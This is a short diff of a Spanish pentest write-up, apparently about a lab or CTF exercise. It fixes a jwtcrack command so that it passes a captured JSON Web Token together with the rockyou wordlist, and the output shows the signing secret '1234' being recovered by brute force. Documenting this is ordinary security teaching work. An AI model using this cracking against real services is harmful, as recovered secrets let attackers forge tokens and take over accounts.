@@ -139,7 +139,7 @@ pablo☠office java-code-analisis$ echo "eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGV
 Por un lado descubrimos que la web trabaja con Java Web Tokens y que podemos hacer fuerza bruta para conocer la clave de la firma del hash, esta password como ya descubrimos es 1234, para comprobarlo podemos usar **Jwtcrack** ver el repo en [hacktools/#password-cracking](../hacktools/#password-cracking) y un diccionario como rockyou.
 
 ```shell 
-(jwtcrack) pablo☠office jwtcrack$ ./crackjwt.py  ~/pentest/wordlist/rockyou.txt 
+(jwtcrack) pablo☠office jwtcrack$ ./crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MzM3NiwiaWF0IjoxNzUyODc4NTc2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.KFTGvUzu1HRjg8dSl68YnUvrt6garU4jqY8bFZPWz0k ~/pentest/wordlist/rockyou.txt 
 Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MzM3NiwiaWF0IjoxNzUyODc4NTc2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.KFTGvUzu1HRjg8dSl68YnUvrt6garU4jqY8bFZPWz0k
 1081081it [00:35, 30313.55it/s]
 Found secret key: 1234
